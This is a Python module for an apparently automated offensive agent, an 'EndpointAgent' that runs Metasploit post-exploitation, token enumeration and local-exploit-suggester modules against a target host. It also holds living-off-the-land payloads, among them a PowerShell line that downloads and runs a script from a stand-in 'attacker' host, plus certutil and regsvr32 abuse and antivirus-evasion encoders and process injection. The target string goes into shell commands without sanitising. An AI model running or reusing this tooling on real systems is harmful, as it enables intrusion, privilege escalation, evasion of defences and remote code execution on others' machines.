from backend.agent.sub_agents.base import BaseAgent


class EndpointAgent(BaseAgent):
    def __init__(self):
        super().__init__(
            name="EndpointAgent",
            engine="InfrastructureEngine",
            allowed_tools=["msfconsole", "sharpedrchecker", "lotl_crafter", "av_bypass"],
            priority=4,
        )

    async def execute(self, target: str, **kwargs):
        from backend.execution.ssh_client import SSHClient
        from backend.execution.shell_manager import ShellManager
        
        ssh = SSHClient()
        shell = ShellManager(ssh)
        
        phase = kwargs.get("phase", "post_exploit")
        
        results = {}
        
        if phase == "post_exploit":
            results = await self._post_exploit(target, shell)
        elif phase == "privilege_escalation":
            results = await self._privilege_escalation(target, shell)
        elif phase == "lotl":
            results = await self._lotl_payloads(target, shell)
        elif phase == "av_bypass":
            results = await self._av_bypass(target, shell)
        else:
            results = await self._post_exploit(target, shell)
            results.update(await self._privilege_escalation(target, shell))
        
        return {
            "agent": self.name,
            "target": target,
            "phase": phase,
            "findings": results.get("findings", []),
            "tools_used": self.allowed_tools,
        }

    async def _post_exploit(self, target: str, shell) -> dict:
        commands = [
            "msfconsole -x 'setg RHOSTS " + target + "; use post/windows/gather/checkvm; run'",
            "msfconsole -x 'setg RHOSTS " + target + "; use post/windows/gather/enum_ad_computers; run'",
        ]
        
        all_output = []
        for cmd in commands:
            try:
                output = await shell.execute(cmd)
                all_output.append(output)
            except Exception as e:
                pass
        
        findings = []
        if any("windows" in o.lower() for o in all_output):
            findings.append({
                "severity": "INFO",
                "type": "os_detection",
                "title": "Windows host confirmed",
            })
        
        if any("meterpreter" in o.lower() for o in all_output):
            findings.append({
                "severity": "INFO",
                "type": "session",
                "title": "Meterpreter session available",
            })
        
        return {
            "findings": findings,
            "output": "\n".join(all_output[:2]),
        }

    async def _privilege_escalation(self, target: str, shell) -> dict:
        cmd = "msfconsole -x 'setg RHOSTS " + target + "; use post/windows/gather/enum_tokens; run'"
        output = await shell.execute(cmd)
        
        findings = []
        if "system" in output.lower():
            findings.append({
                "severity": "HIGH",
                "type": "privilege_escalation",
                "title": "SYSTEM privileges obtained",
            })
        
        if "delegate" in output.lower():
            findings.append({
                "severity": "HIGH",
                "type": "token_impersonation",
                "title": "Token impersonation possible",
            })
        
        cmd2 = "msfconsole -x 'setg RHOSTS " + target + "; use post/multi/recon/local_exploit_suggester; run'"
        output2 = await shell.execute(cmd2)
        
        if "exploitable" in output2.lower():
            findings.append({
                "severity": "HIGH",
                "type": "local_exploit",
                "title": "Local privilege escalation exploit available",
            })
        
        return {
            "findings": findings,
            "output": output[:500],
        }

    async def _lotl_payloads(self, target: str, shell) -> dict:
        payload_types = [
            ("powershell", "IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"),
            ("wmi", "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'calc.exe'"),
            ("certutil", "certutil -encode payload.bin payload.b64 && certutil -decode payload.b64 payload.exe"),
            ("regsvr32", "regsvr32 /s /u scrobj.dll"),
        ]
        
        findings = []
        for ptype, _ in payload_types:
            findings.append({
                "severity": "INFO",
                "type": "lotl",
                "title": f"LOtL method available: {ptype}",
            })
        
        return {
            "findings": findings,
            "payloads": payload_types,
        }

    async def _av_bypass(self, target: str, shell) -> dict:
        encoding_methods = [
            "shikata_ga_nai",
            "call4_dword_xor",
            "powershell_base64",
        ]
        
        findings = []
        for encoding in encoding_methods:
            findings.append({
                "severity": "MEDIUM",
                "type": "av_bypass",
                "title": f"Encoding available: {encoding}",
            })
        
        sleep_obfuscation = [
            ("sleep", "1 second delay to bypass AV timing"),
            ("process injection", "inject into legitimate process"),
        ]
        
        for technique, _ in sleep_obfuscation:
            findings.append({
                "severity": "MEDIUM",
                "type": "av_bypass",
                "title": f"Technique available: {technique}",
            })
        
        findings.append({
            "severity": "HIGH",
            "type": "sharpdrchecker",
            "title": "EDR enumeration available",
        })
        
        return {"findings": findings}

    def get_fields(self):
        return ["Endpoint"]